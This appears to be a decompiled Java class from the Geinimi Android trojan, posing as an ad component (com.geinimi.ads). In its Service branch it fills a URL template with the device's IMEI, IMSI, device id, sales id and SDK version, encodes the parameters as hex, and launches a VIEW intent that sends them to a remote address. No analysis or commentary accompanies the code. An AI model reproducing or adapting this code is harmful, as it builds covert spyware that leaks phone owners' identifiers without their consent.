package com.geinimi.ads;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import com.geinimi.AdActivity;
import com.geinimi.C0000r;
import com.geinimi.c.k;
import com.geinimi.c.l;
import com.geinimi.c.m;
import java.net.URLDecoder;

public final class d extends Advertisable {
    private String[] b = {"open_url", "local_file_path"};

    protected d(String str) {
        super(str);
    }

    public final boolean b() {
        String a = a((String) "open_url");
        if (a.endsWith(C0000r.w)) {
            a("local_file_path", l.c(a.substring(0, a.length() - 4) + "_cipher.zip", k.e));
        }
        return true;
    }

    public final void c() {
        a("open_url", this.a);
    }

    public final int d() {
        return 17301591;
    }

    public final int e() {
        return 17301618;
    }

    public final Intent f() {
        if (a() instanceof Activity) {
            if (a((String) "local_file_path") != null) {
                a(AdActivity.STR_PARA_URL_KEY, a((String) "local_file_path"));
            } else {
                if (a((String) "open_url").endsWith(C0000r.w)) {
                    a(AdActivity.STR_PARA_URL_KEY, r0.substring(0, r0.indexOf(C0000r.w)) + ".html");
                } else {
                    a(AdActivity.STR_PARA_URL_KEY, a((String) "open_url"));
                }
            }
        } else if (a() instanceof Service) {
            String decode = URLDecoder.decode(this.a);
            while (true) {
                int indexOf = decode.indexOf("@@");
                if (indexOf < 0) {
                    break;
                }
                String substring = decode.substring(0, indexOf);
                String substring2 = decode.substring(indexOf + 2);
                int indexOf2 = substring2.indexOf("@(");
                if (indexOf2 < 0) {
                    break;
                }
                String substring3 = substring2.substring(0, indexOf2);
                String substring4 = substring2.substring(indexOf2 + 2);
                int indexOf3 = substring4.indexOf(41);
                if (indexOf3 < 0) {
                    break;
                }
                String substring5 = substring4.substring(0, indexOf3);
                String substring6 = substring4.substring(indexOf3 + 1);
                decode = substring3.endsWith("cpid") ? substring + k.b() + substring6 : substring3.endsWith("ptid") ? substring + k.c() + substring6 : substring3.endsWith("imei") ? substring + k.f + substring6 : substring3.endsWith("imsi") ? substring + k.s + substring6 : substring3.endsWith("salesid") ? substring + k.d() + substring6 : substring3.endsWith("did") ? substring + k.e() + substring6 : substring3.equals("sdkver") ? substring + k.f() + substring6 : substring3.equals("autosdkver") ? substring + k.g() + substring6 : substring + substring5 + substring6;
            }
            String substring7 = decode.substring(decode.lastIndexOf(63) + 1);
            String substring8 = decode.substring(0, decode.lastIndexOf(63) + 1);
            byte[] b2 = m.b(substring7.getBytes());
            if (b2 == null) {
                return null;
            }
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b3 : b2) {
                String hexString = Integer.toHexString(b3 & 255);
                if (hexString.length() < 2) {
                    stringBuffer.append("0" + hexString);
                } else {
                    stringBuffer.append(hexString);
                }
            }
            return new Intent("android.intent.action.VIEW", Uri.parse(substring8 + "params=" + stringBuffer.toString()));
        }
        return null;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
